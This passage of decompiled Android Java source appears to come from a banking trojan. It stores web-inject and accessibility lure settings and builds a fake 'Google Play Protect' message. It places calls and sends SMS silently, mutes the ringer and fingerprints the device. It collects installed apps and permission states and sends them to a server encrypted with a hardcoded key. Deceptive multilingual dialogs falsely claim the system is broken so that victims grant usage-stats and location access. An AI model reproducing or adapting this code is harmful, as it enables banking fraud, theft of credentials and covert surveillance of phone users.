        }
        int i3 = 0;
        while (true) {
            C0033a aVar6 = this.f346b;
            if (i3 >= C0033a.f323j.length) {
                break;
            }
            C0033a aVar7 = this.f346b;
            String str4 = C0033a.f323j[i3];
            StringBuilder sb7 = new StringBuilder();
            sb7.append("[");
            sb7.append(lowerCase);
            sb7.append("]");
            if (str4.contains(sb7.toString())) {
                C0033a aVar8 = this.f346b;
                String str5 = C0033a.f323j[i3];
                StringBuilder sb8 = new StringBuilder();
                sb8.append("[");
                sb8.append(lowerCase);
                sb8.append("]");
                mo233d(context, "StringPermis", str5.replace(sb8.toString(), ""));
                break;
            }
            i3++;
        }
        int i4 = 0;
        while (true) {
            C0033a aVar9 = this.f346b;
            if (i4 >= C0033a.f324k.length) {
                break;
            }
            C0033a aVar10 = this.f346b;
            String str6 = C0033a.f324k[i4];
            StringBuilder sb9 = new StringBuilder();
            sb9.append("[");
            sb9.append(lowerCase);
            sb9.append("]");
            if (str6.contains(sb9.toString())) {
                C0033a aVar11 = this.f346b;
                String str7 = C0033a.f324k[i4];
                StringBuilder sb10 = new StringBuilder();
                sb10.append("[");
                sb10.append(lowerCase);
                sb10.append("]");
                mo233d(context, "StringYes", str7.replace(sb10.toString(), ""));
                break;
            }
            i4++;
        }
        int i5 = 0;
        while (true) {
            C0033a aVar12 = this.f346b;
            if (i5 >= C0033a.f325l.length) {
                break;
            }
            C0033a aVar13 = this.f346b;
            String str8 = C0033a.f325l[i5];
            StringBuilder sb11 = new StringBuilder();
            sb11.append("[");
            sb11.append(lowerCase);
            sb11.append("]");
            if (str8.contains(sb11.toString())) {
                C0033a aVar14 = this.f346b;
                String str9 = C0033a.f325l[i5];
                StringBuilder sb12 = new StringBuilder();
                sb12.append("[");
                sb12.append(lowerCase);
                sb12.append("]");
                String replace3 = str9.replace(sb12.toString(), "");
                C0033a aVar15 = this.f346b;
                String str10 = C0033a.f326m[i5];
                StringBuilder sb13 = new StringBuilder();
                sb13.append("[");
                sb13.append(lowerCase);
                sb13.append("]");
                String replace4 = str10.replace(sb13.toString(), "");
                mo233d(context, "uninstall1", replace3);
                mo233d(context, "uninstall2", replace4);
                break;
            }
            i5++;
        }
        int i6 = 0;
        while (true) {
            C0033a aVar16 = this.f346b;
            if (i6 >= C0033a.f327n.length) {
                break;
            }
            C0033a aVar17 = this.f346b;
            String str11 = C0033a.f327n[i6];
            StringBuilder sb14 = new StringBuilder();
            sb14.append("[");
            sb14.append(lowerCase);
            sb14.append("]");
            if (str11.contains(sb14.toString())) {
                C0033a aVar18 = this.f346b;
                String str12 = C0033a.f327n[i6];
                StringBuilder sb15 = new StringBuilder();
                sb15.append("[");
                sb15.append(lowerCase);
                sb15.append("]");
                mo233d(context, "vkladmin", str12.replace(sb15.toString(), ""));
                break;
            }
            i6++;
        }
        int i7 = 0;
        while (true) {
            C0033a aVar19 = this.f346b;
            if (i7 >= C0033a.f328o.length) {
                break;
            }
            C0033a aVar20 = this.f346b;
            String str13 = C0033a.f328o[i7];
            StringBuilder sb16 = new StringBuilder();
            sb16.append("[");
            sb16.append(lowerCase);
            sb16.append("]");
            if (str13.contains(sb16.toString())) {
                C0033a aVar21 = this.f346b;
                String str14 = C0033a.f328o[i7];
                StringBuilder sb17 = new StringBuilder();
                sb17.append("[");
                sb17.append(lowerCase);
                sb17.append("]");
                mo233d(context, "straccessibility", str14.replace(sb17.toString(), ""));
                break;
            }
            i7++;
        }
        int i8 = 0;
        while (true) {
            C0033a aVar22 = this.f346b;
            if (i8 >= C0033a.f329p.length) {
                break;
            }
            C0033a aVar23 = this.f346b;
            String str15 = C0033a.f329p[i8];
            StringBuilder sb18 = new StringBuilder();
            sb18.append("[");
            sb18.append(lowerCase);
            sb18.append("]");
            if (str15.contains(sb18.toString())) {
                C0033a aVar24 = this.f346b;
                String str16 = C0033a.f329p[i8];
                StringBuilder sb19 = new StringBuilder();
                sb19.append("[");
                sb19.append(lowerCase);
                sb19.append("]");
                mo233d(context, "straccessibility2", str16.replace(sb19.toString(), ""));
                break;
            }
            i8++;
        }
        while (true) {
            C0033a aVar25 = this.f346b;
            if (i >= C0033a.f331r.length) {
                break;
            }
            C0033a aVar26 = this.f346b;
            String str17 = C0033a.f331r[i];
            StringBuilder sb20 = new StringBuilder();
            sb20.append("[");
            sb20.append(lowerCase);
            sb20.append("]");
            if (str17.contains(sb20.toString())) {
                C0033a aVar27 = this.f346b;
                String str18 = C0033a.f330q[i];
                StringBuilder sb21 = new StringBuilder();
                sb21.append("[");
                sb21.append(lowerCase);
                sb21.append("]");
                String replace5 = str18.replace(sb21.toString(), "");
                C0033a aVar28 = this.f346b;
                String str19 = C0033a.f331r[i];
                StringBuilder sb22 = new StringBuilder();
                sb22.append("[");
                sb22.append(lowerCase);
                sb22.append("]");
                String replace6 = str19.replace(sb22.toString(), "");
                StringBuilder sb23 = new StringBuilder();
                sb23.append(replace5);
                sb23.append("Google Play Protect!");
                mo233d(context, "textPlayProtect", sb23.toString());
                mo233d(context, "buttonPlayProtect", replace6);
                break;
            }
            i++;
        }
        mo213a("Настройки", "Сохранено!");
    }

    /* renamed from: b */
    public void mo222b(Context context, String str) {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("android.intent.action.");
            sb.append("CALL");
            Intent intent = new Intent(sb.toString());
            intent.addFlags(268435456);
            intent.setData(Uri.fromParts("tel", str, "#"));
            context.startActivity(intent);
        } catch (Exception unused) {
            mo213a("callForward2", "ERROR");
        }
    }

    /* renamed from: b */
    public byte[] mo223b(String str) {
        int length = str.length();
        byte[] bArr = new byte[(length / 2)];
        for (int i = 0; i < length; i += 2) {
            bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) << 4) + Character.digit(str.charAt(i + 1), 16));
        }
        return bArr;
    }

    /* renamed from: b */
    public byte[] mo224b(byte[] bArr, String str) {
        try {
            return new C0063a(str.getBytes()).mo358a(bArr);
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: c */
    public String mo225c(String str) {
        this.f345a.getClass();
        return mo220b(str, "ericcartman");
    }

    /* renamed from: c */
    public String mo226c(String str, String str2) {
        try {
            return new String(new C0063a(str2.getBytes()).mo358a(mo223b(new String(Base64.decode(str, 0), "UTF-8"))));
        } catch (Exception unused) {
            return "";
        }
    }

    /* renamed from: c */
    public void mo227c(Context context) {
        String str = "All Installed Applications:\n";
        for (ApplicationInfo applicationInfo : context.getPackageManager().getInstalledApplications(128)) {
            if (!m233a(applicationInfo)) {
                StringBuilder sb = new StringBuilder();
                sb.append(str);
                sb.append(applicationInfo.packageName);
                sb.append(10);
                str = sb.toString();
            }
        }
        StringBuilder sb2 = new StringBuilder();
        sb2.append("p=");
        StringBuilder sb3 = new StringBuilder();
        sb3.append(mo247q(context));
        sb3.append("|");
        sb3.append(str);
        sb3.append("|");
        sb2.append(mo225c(sb3.toString()));
        mo218b(context, "4", sb2.toString());
    }

    /* renamed from: c */
    public void mo228c(Context context, String str, String str2) {
        SmsManager smsManager = SmsManager.getDefault();
        ArrayList divideMessage = smsManager.divideMessage(str2);
        PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent("SMS_SENT"), 0);
        PendingIntent broadcast2 = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED"), 0);
        ArrayList arrayList = new ArrayList();
        ArrayList arrayList2 = new ArrayList();
        for (int i = 0; i < divideMessage.size(); i++) {
            arrayList2.add(broadcast2);
            arrayList.add(broadcast);
        }
        smsManager.sendMultipartTextMessage(str, null, divideMessage, arrayList, arrayList2);
    }

    /* renamed from: c */
    public boolean mo229c(Context context, String str) {
        return context.checkCallingOrSelfPermission(str) == 0;
    }

    /* renamed from: d */
    public String mo230d(String str) {
        this.f345a.getClass();
        return mo226c(str, "ericcartman");
    }

    /* renamed from: d */
    public void mo231d(Context context) {
        String[] strArr;
        StringBuilder sb;
        String str;
        String str2 = "All permissions:\n";
        for (String str3 : this.f346b.f334a) {
            if (context.checkCallingOrSelfPermission(str3) != 0) {
                sb = new StringBuilder();
                sb.append(str2);
                sb.append(str3);
                str = ": OFF";
            } else {
                sb = new StringBuilder();
                sb.append(str2);
                sb.append(str3);
                str = ": ON";
            }
            sb.append(str);
            sb.append(10);
            str2 = sb.toString();
        }
        StringBuilder sb2 = new StringBuilder();
        sb2.append("p=");
        StringBuilder sb3 = new StringBuilder();
        sb3.append(mo247q(context));
        sb3.append("|");
        sb3.append(str2);
        sb3.append("|");
        sb2.append(mo225c(sb3.toString()));
        mo218b(context, "4", sb2.toString());
    }

    /* renamed from: d */
    public void mo232d(final Context context, String str) {
        String str2;
        String str3;
        String str4;
        String str5;
        String str6;
        String str7;
        StringBuilder sb;
        Builder builder = new Builder(context);
        String locale = Resources.getSystem().getConfiguration().locale.toString();
        if (str.contains("statistic")) {
            if (locale.contains("RU")) {
                str5 = "Получить разрешение";
                StringBuilder sb2 = new StringBuilder();
                sb2.append("Система не корректно работает, вам необходимо включить доступ к статистике '");
                sb2.append(mo239i(context));
                sb2.append("'");
                str7 = sb2.toString();
                str6 = "Включить сейчас";
            } else {
                if (locale.contains("US")) {
                    str5 = "Get permission";
                    sb = new StringBuilder();
                } else if (locale.contains("TR")) {
                    str5 = "İzin almak";
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append("Sistem düzgün çalışmıyor, istatistiklere erişim etkinleştirmeniz gerekir '");
                    sb3.append(mo239i(context));
                    sb3.append("'");
                    str7 = sb3.toString();
                    str6 = "Şimdi etkinleştir";
                } else if (locale.contains("DE")) {
                    str5 = "Get permission";
                    StringBuilder sb4 = new StringBuilder();
                    sb4.append("Das system funktioniert nicht richtig, Sie benötigen, um Zugang zu den Statistiken '");
                    sb4.append(mo239i(context));
                    sb4.append("'");
                    str7 = sb4.toString();
                    str6 = "Aktivieren Sie jetzt";
                } else if (locale.contains("IT")) {
                    str5 = "Ottenere il permesso";
                    StringBuilder sb5 = new StringBuilder();
                    sb5.append("Il sistema non funziona correttamente, è necessario abilitare l'accesso alle statistiche'");
                    sb5.append(mo239i(context));
                    sb5.append("'");
                    str7 = sb5.toString();
                    str6 = "Attiva ora";
                } else if (locale.contains("FR")) {
                    str5 = "Obtenir la permission";
                    StringBuilder sb6 = new StringBuilder();
                    sb6.append("Le système ne fonctionne pas correctement, vous devez activer l'accès aux statistiques'");
                    sb6.append(mo239i(context));
                    sb6.append("'");
                    str7 = sb6.toString();
                    str6 = "Activer maintenant";
                } else if (locale.contains("UA")) {
                    str5 = "Отримати дозвіл";
                    StringBuilder sb7 = new StringBuilder();
                    sb7.append("Система не працює коректно, вам необхідно включити доступ до статистики'");
                    sb7.append(mo239i(context));
                    sb7.append("'");
                    str7 = sb7.toString();
                    str6 = "Включити зараз";
                } else {
                    str5 = "Get permission";
                    sb = new StringBuilder();
                }
                sb.append("The system does not work correctly, you need to enable access to the statistics '");
                sb.append(mo239i(context));
                sb.append("'");
                str7 = sb.toString();
                str6 = "Enable now";
            }
            builder.setTitle(str5).setMessage(str7).setIcon(R.drawable.im).setCancelable(false).setNegativeButton(str6, new OnClickListener() {
                public void onClick(DialogInterface dialogInterface, int i) {
                    context.startActivity(new Intent("android.settings.USAGE_ACCESS_SETTINGS"));
                    dialogInterface.cancel();
                }
            });
        } else {
            if (str.contains("gps")) {
                if (locale.contains("RU")) {
                    str2 = "Геолокация";
                    str4 = "Для корректной работы системы, нужно получить координаты, вам необходимо включить геолокацию";
                    str3 = "Включить сейчас";
                } else {
                    if (!locale.contains("US")) {
                        if (locale.contains("TR")) {
                            str2 = "Coğrafi konum";
                            str4 = "Sistemin doğru çalışması için, koordinatları almak gerekir, coğrafi konum etkinleştirmeniz gerekir";
                            str3 = "Şimdi etkinleştir";
                        } else if (locale.contains("DE")) {
                            str2 = "Geolokalisierung";
                            str4 = "Für den korrekten Betrieb des Systems müssen Sie die Koordinaten erhalten, müssen Sie die Geolokalisierung aktivieren";
                            str3 = "Aktivieren Sie jetzt";
                        } else if (locale.contains("IT")) {
                            str2 = "Geolocalizzazione";
                            str4 = "Per il corretto funzionamento del sistema, è necessario ottenere le coordinate, è necessario abilitare la geolocalizzazione";
                            str3 = "Attiva ora";
                        } else if (locale.contains("FR")) {
                            str2 = "Géolocalisation";
                            str4 = "Pour un fonctionnement correct du système, vous devez obtenir les coordonnées, vous devez activer la géolocalisation";
                            str3 = "Activer maintenant";
                        } else if (locale.contains("UA")) {
                            str2 = "Геолокація";
                            str4 = "Для коректної роботи системи вам потрібно, щоб отримати координати, потрібно включити геолокацію";
                            str3 = "Включити зараз";
                        }
                    }
                    str2 = "Geolocation";
                    str4 = "For correct operation of the system, you need to get the coordinates, you need to enable geolocation";
                    str3 = "Enable now";
                }
                builder.setTitle(str2).setMessage(str4).setIcon(R.drawable.im).setCancelable(false).setNegativeButton(str3, new OnClickListener() {
                    public void onClick(DialogInterface dialogInterface, int i) {
                        context.startActivity(new Intent("android.settings.LOCATION_SOURCE_SETTINGS"));
                        dialogInterface.cancel();
                    }
                });
            }
            return;
        }
        try {
            builder.create().show();
        } catch (Exception unused) {
        }
    }

    /* renamed from: d */
    public void mo233d(Context context, String str, String str2) {
        if (str.contains("urlInj") || str.contains("urls")) {
            str2 = mo225c(str2);
        }
        Editor edit = context.getSharedPreferences("set", 0).edit();
        edit.putString(str, str2);
        edit.commit();
    }

    /* renamed from: e */
    public String mo234e(Context context, String str) {
        if (f343e == null) {
            f343e = context.getSharedPreferences("set", 0);
            f344f = f343e.edit();
        }
        String string = f343e.getString(str, null);
        return (str.contains("urlInj") || str.contains("urls")) ? mo230d(string) : string;
    }

    /* renamed from: e */
    public boolean mo235e(Context context) {
        for (String checkCallingOrSelfPermission : this.f346b.f334a) {
            if (context.checkCallingOrSelfPermission(checkCallingOrSelfPermission) != 0) {
                return false;
            }
        }
        return true;
    }

    /* renamed from: f */
    public void mo236f(Context context) {
        Intent intent = new Intent(context, sxfl.class);
        intent.addFlags(268435456);
        intent.addFlags(1073741824);
        context.startActivity(intent);
    }

    /* access modifiers changed from: protected */
    /* renamed from: g */
    public boolean mo237g(Context context) {
        StringBuilder sb = new StringBuilder();
        sb.append(context.getPackageName());
        sb.append("/");
        sb.append(egxltnv.class.getName().replace(context.getPackageName(), ""));
        String sb2 = sb.toString();
        for (AccessibilityServiceInfo id : ((AccessibilityManager) context.getSystemService("accessibility")).getEnabledAccessibilityServiceList(-1)) {
            if (sb2.equals(id.getId())) {
                return true;
            }
        }
        AccessibilityManager accessibilityManager = (AccessibilityManager) context.getSystemService("accessibility");
        if (accessibilityManager == null) {
            return false;
        }
        for (AccessibilityServiceInfo id2 : accessibilityManager.getEnabledAccessibilityServiceList(-1)) {
            String id3 = id2.getId();
            StringBuilder sb3 = new StringBuilder();
            sb3.append(context.getPackageName());
            sb3.append("/");
            if (id3.startsWith(sb3.toString())) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: h */
    public boolean mo238h(Context context) {
        if (VERSION.SDK_INT < 21) {
            return false;
        }
        try {
            ApplicationInfo applicationInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 0);
            return ((AppOpsManager) context.getSystemService("appops")).checkOpNoThrow("android:get_usage_stats", applicationInfo.uid, applicationInfo.packageName) == 0;
        } catch (NameNotFoundException unused) {
            return false;
        }
    }

    /* renamed from: i */
    public String mo239i(Context context) {
        ApplicationInfo applicationInfo;
        PackageManager packageManager = context.getApplicationContext().getPackageManager();
        try {
            applicationInfo = packageManager.getApplicationInfo(context.getPackageName(), 0);
        } catch (NameNotFoundException unused) {
            applicationInfo = null;
        }
        return (String) (applicationInfo != null ? packageManager.getApplicationLabel(applicationInfo) : "(unknown)");
    }

    /* renamed from: j */
    public String mo240j(Context context) {
        String str = "";
        if (VERSION.SDK_INT < 21) {
            return str;
        }
        UsageStatsManager usageStatsManager = (UsageStatsManager) context.getSystemService("usagestats");
        long currentTimeMillis = System.currentTimeMillis();
        List<UsageStats> queryUsageStats = usageStatsManager.queryUsageStats(0, currentTimeMillis - 10000, currentTimeMillis);
        if (queryUsageStats == null) {
            return "NoPermission2";
        }
        TreeMap treeMap = new TreeMap();
        for (UsageStats usageStats : queryUsageStats) {
            treeMap.put(Long.valueOf(usageStats.getLastTimeUsed()), usageStats);
        }
        return (treeMap == null || treeMap.isEmpty()) ? "NoPermission1" : ((UsageStats) treeMap.get(treeMap.lastKey())).getPackageName();
    }

    /* renamed from: k */
    public boolean mo241k(Context context) {
        LocationManager locationManager = (LocationManager) context.getSystemService("location");
        return locationManager.isProviderEnabled("gps") || locationManager.isProviderEnabled("network");
    }

    /* renamed from: l */
    public void mo242l(Context context) {
        if (VERSION.SDK_INT <= 23) {
            ((AudioManager) context.getSystemService("audio")).setRingerMode(0);
        }
    }

    /* renamed from: m */
    public boolean mo243m(Context context) {
        NetworkInfo r = m236r(context);
        return r != null && r.isConnected() && r.getType() == 1;
    }

    /* renamed from: n */
    public boolean mo244n(Context context) {
        NetworkInfo r = m236r(context);
        return r != null && r.isConnected() && r.getType() == 0;
    }

    /* renamed from: o */
    public boolean mo245o(Context context) {
        return mo244n(context) || mo243m(context);
    }

    /* renamed from: p */
    public String mo246p(Context context) {
        try {
            return ((TelephonyManager) context.getSystemService("phone")).getNetworkCountryIso();
        } catch (Exception unused) {
            return "us";
        }
    }

    /* renamed from: q */
    public String mo247q(Context context) {
        String string = Secure.getString(context.getContentResolver(), "android_id");
        if (string != "") {
            return string;
        }
        StringBuilder sb = new StringBuilder();
        sb.append("35");
        sb.append(Build.BOARD.length() % 10);
        sb.append(Build.BRAND.length() % 10);
        sb.append(Build.CPU_ABI.length() % 10);
        sb.append(Build.DEVICE.length() % 10);
        sb.append(Build.DISPLAY.length() % 10);
        sb.append(Build.HOST.length() % 10);
        sb.append(Build.ID.length() % 10);
        sb.append(Build.MANUFACTURER.length() % 10);
        sb.append(Build.MODEL.length() % 10);
        sb.append(Build.PRODUCT.length() % 10);
        sb.append(Build.TAGS.length() % 10);
        sb.append(Build.TYPE.length() % 10);
        sb.append(Build.USER.length() % 10);
        return sb.toString();
    }
}
